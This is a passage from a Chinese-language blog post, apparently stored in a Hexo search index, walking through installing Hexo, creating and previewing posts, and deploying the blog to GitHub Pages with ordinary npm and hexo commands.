class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>参照官网<a href="https://hexo.io" target="_blank" rel="noopener">Hexo官网</a>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure></p><p>安装完成,可以在命令行下使用.<br><img src="http://img.hi-arkin.com/2018-12-13-15446980382305.jpg" alt=""></p><h3 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p><img src="http://img.hi-arkin.com/2018-12-13-15446999681293.jpg" alt=""></p><p>创建完如下:<br><img src="http://img.hi-arkin.com/2018-12-13-15447000524322.jpg" alt=""><br><img src="http://img.hi-arkin.com/2018-12-13-15447001845301.jpg" alt=""></p><h3 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new 文章名</span><br></pre></td></tr></table></figure><p><img src="http://img.hi-arkin.com/2018-12-13-15447002639868.jpg" alt=""></p><p>打开,如图结构<br><img src="http://img.hi-arkin.com/2018-12-13-15447002979205.jpg" alt=""></p><h3 id="运行预览服务"><a href="#运行预览服务" class="headerlink" title="运行预览服务"></a>运行预览服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="http://img.hi-arkin.com/2018-12-13-15447003989020.jpg" alt=""></p><p>找开网址,便能看到Blog界面<br><img src="http://img.hi-arkin.com/2018-12-13-15447004960789.jpg" alt=""></p><h3 id="配置GitHubPage"><a href="#配置GitHubPage" class="headerlink" title="配置GitHubPage"></a>配置GitHubPage</h3><p>注册GitHub,略<br>新建GitHubPage<br><a href="https://pages.github.com/" target="_blank" rel="noopener">https://pages.github.com/</a><br>创建一个git仓库,名字如下,xxx.github.io<br>就可以使用xxx.github.io访问了<br><img src="http://img.hi-arkin.com/2018-12-13-15447008475364.jpg" alt=""></p><p>复制仓库地址,配置hexo<br>如:<br><a href="https://github.com/arkin-j/arkin-j.github.io.git" target="_blank" rel="noopener">https://github.com/arkin-j/arkin-j.github.io.git</a></p><h3 id="配置发布"><a href="#配置发布" class="headerlink" title="配置发布"></a>配置发布</h3><p>在刚创建的目录下,修改_config.yml文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim _config.yml</span><br></pre></td></tr></table></figure></p><p>具体查看帮助 <a href="https://hexo.io/docs/deployment" target="_blank" rel="noopener">https://hexo.io/docs/deployment</a><br>如<br><img src="http://img.hi-arkin.com/2018-12-13-15447011557701.jpg" alt=""></p><p>创建完文章,便可以使用命令发布了,需要在项目目录下执行.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo deploy</span><br></pre></td></tr></table></figure><p><img src="http://img.hi-arkin.com/2018-12-13-15447013903714.jpg" alt=""></p><p>然后再访问刚才创建的gitpage<br>如:<a href="https://arkin-j.github.io/" target="_blank" rel="noopener">https://arkin-j.github.io/</a></p><p>就可以看到新的文章了.<br>如下:<br><img src="http://img.hi-arkin.com/2018-12-13-15447016706059.jpg" alt=""></p><p>模板在项目目录下,可以修改,也可以使用别人现在的.</p><p> 完 &gt;&gt;&gt;</p>]]></content>
      
      
      <categories>
          
          <category> 其它 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
            <tag> Hexo </tag>
            
            <tag> MWeb </tag>
            
            <tag> GitPage </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
